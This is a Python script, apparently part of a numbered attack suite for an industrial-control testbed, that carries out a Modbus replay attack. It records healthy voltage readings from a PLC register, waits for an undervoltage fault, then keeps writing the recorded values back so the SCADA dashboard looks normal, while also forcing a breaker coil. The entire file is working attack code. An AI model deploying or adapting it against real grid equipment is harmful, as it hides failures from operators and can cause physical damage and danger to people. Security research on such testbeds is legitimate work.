#!/usr/bin/env python3
"""
ATK-07 | Replay Attack
=======================
This attack is more advanced than a Stale Data Freeze (ATK-10). Instead of
freezing the dashboard to a single static number (which might look suspicious
to an operator because real grids always have slight fluctuations), a Replay
Attack records a window of real, fluctuating "healthy" data. 

When a physical fault occurs, it violently loops the recorded healthy data
back into the PLC. The SCADA dashboard sees realistic, fluctuating, healthy
telemetry while the system is actually failing.

Usage
-----
    python atk07_replay_attack.py
    python atk07_replay_attack.py --target 127.0.0.1 --port 5020 --register 1024 --record_time 10
"""
import argparse
import time
from pymodbus.client import ModbusTcpClient

def main():
    parser = argparse.ArgumentParser(
        description="ATK-07: Record normal telemetry and replay it during a fault."
    )
    parser.add_argument("--target", type=str, default="127.0.0.1", help="Target IED IP address")
    parser.add_argument("--port", type=int, default=5020, help="Target IED Modbus TCP port")
    parser.add_argument("--register", type=int, default=1024, help="Register to record/replay (default 1024 = %MW0)")
    parser.add_argument("--record_time", type=int, default=10, help="Seconds of healthy data to record")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("  ATK-07  |  Replay Attack (Record & Playback)")
    print("=" * 60)
    print(f"[*] Target IED      : {args.target}:{args.port}")
    print(f"[*] Target Register : {args.register}")
    print()

    client = ModbusTcpClient(args.target, port=args.port)
    if not client.connect():
        print("[-] FAILED: Could not connect to the Modbus server. Is the stack running?")
        return
        
    print(f"[*] PHASE 1: Recording {args.record_time} seconds of healthy background noise...")
    recorded_data = []
    
    record_end = time.time() + args.record_time
    try:
        while time.time() < record_end:
            resp = client.read_holding_registers(args.register, count=1)
            if not resp.isError():
                recorded_data.append(resp.registers[0])
            time.sleep(0.1) # 10 samples per second
    except KeyboardInterrupt:
        pass
        
    if not recorded_data:
        print("[-] Error: No data was recorded. Exiting.")
        client.close()
        return
        
    print(f"[+] Recording complete. Captured {len(recorded_data)} data points.")
    
    print("\n[*] PHASE 2: Waiting for a fault to trigger the replay...")
    print("[*] (The script is waiting for the voltage to drop below 0.90 pu / 900)")
    
    try:
        fault_detected = False
        while not fault_detected:
            resp = client.read_holding_registers(args.register, count=1)
            if not resp.isError():
                value = resp.registers[0]
                # If voltage drops below 900 (0.90 pu), that's an undervoltage fault
                if value < 900:
                    print(f"\n[!] FAULT DETECTED (Value: {value}). Triggering Replay!")
                    fault_detected = True
            time.sleep(0.1)
            
    except KeyboardInterrupt:
        print("\n[!] Attack halted by user before fault was detected.")
        client.close()
        return
        
    print("\n[*] PHASE 3: Actively replaying healthy tape... Press CTRL+C to stop.")
    try:
        iteration = 0
        while True:
            # Loop through our recorded tape
            for healthy_value in recorded_data:
                # Optionally, we also hold the breaker CLOSED (Coil 0) just in case
                client.write_register(args.register, healthy_value)
                client.write_coil(0, False)
                time.sleep(0.1)
                
            iteration += 1
            print(f"[~] Replayed tape {iteration} times...", end="\r")
            
    except KeyboardInterrupt:
        print("\n\n[!] Replay halted by user.")
    except Exception as e:
        print(f"\n\n[-] Exception: {e}")
    finally:
        client.close()
        print("[*] Modbus connection closed.")


if __name__ == "__main__":
    main()
